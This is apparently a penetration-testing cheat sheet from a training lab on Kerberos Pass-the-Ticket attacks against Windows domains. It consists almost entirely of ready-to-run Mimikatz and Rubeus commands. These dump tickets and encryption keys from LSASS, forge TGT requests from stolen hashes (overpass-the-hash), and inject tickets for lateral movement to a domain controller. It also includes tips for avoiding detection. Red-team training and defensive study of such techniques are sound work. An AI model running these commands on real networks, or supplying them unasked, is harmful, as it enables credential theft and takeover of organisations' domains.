# Pass the Ticket from Windows
```table-of-contents
```
## Harvesting Tickets
### Mimikatz (Export to .kirbi)
```powershell
# Export all tickets from LSASS
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit
```
**File Naming Convention:**
- `[random]-username@service-domain.kirbi`
- **User Ticket:** `username@service...`
- **Machine Ticket:** `computername$@service...` (Ends with `$`)
- **TGT:** Service name is `krbtgt`.
### Rubeus (Dump to Base64)
```powershell
# Dump all tickets
Rubeus.exe dump /nowrap

# Dump specific service (e.g., krbtgt)
Rubeus.exe dump /service:krbtgt /nowrap
```
## OverPass the Hash (Pass the Key)
### Step 1: Extract Keys
```powershell
mimikatz.exe "privilege::debug" "sekurlsa::ekeys" exit
```
### Step 2: Request TGT
**Using Rubeus (Preferred for AES):** Modern Windows environments may detect RC4 (NTLM) requests as "Encryption Downgrade" attacks. Use AES if available.
```powershell
# Syntax: Rubeus.exe asktgt /domain:<Domain> /user:<User> /aes256:<Key> /nowrap
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc... /nowrap
```

**Using Mimikatz:** This spawns a new `cmd.exe` window with the ticket injected.
```powershell
# Syntax: sekurlsa::pth /domain:<Domain> /user:<User> /ntlm:<Hash>
mimikatz.exe "privilege::debug" "sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa..." exit
```
## Pass the Ticket (Execution)
### Using Rubeus (Base64 or File)
```powershell
# Import Base64 Ticket
Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA...

# Import from .kirbi file
Rubeus.exe ptt /ticket:ticket.kirbi
```
### Using Mimikatz
```powershell
mimikatz.exe "kerberos::ptt ticket.kirbi" exit
```
### Helper: Convert .kirbi to Base64 (PowerShell)
```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("ticket.kirbi"))
```
## Lateral Movement via PowerShell Remoting
### Method A: Direct Injection (Mimikatz)
Inject the ticket into the current session and connect.
1. Inject ticket: `mimikatz.exe "kerberos::ptt ticket.kirbi"`
2. Connect: `Enter-PSSession -ComputerName DC01`
### Method B: Sacrificial Process (Rubeus) - **OPSEC Safe**
**1. Create Sacrificial Process**
```powershell
# /program defaults to cmd.exe. /show reveals the window (optional)
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```
**2. Request & Inject TGT** Use `asktgt` with the `/ptt` flag. Rubeus detects the sacrificial process and injects it there automatically if run from that context, or you can manually target the LUID.
```powershell
# Request TGT and Pass-the-Ticket immediately
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:<Key> /ptt
```
**3. Connect** Inside the new `cmd.exe` window (the sacrificial process):
```powershell
powershell
Enter-PSSession -ComputerName DC01
```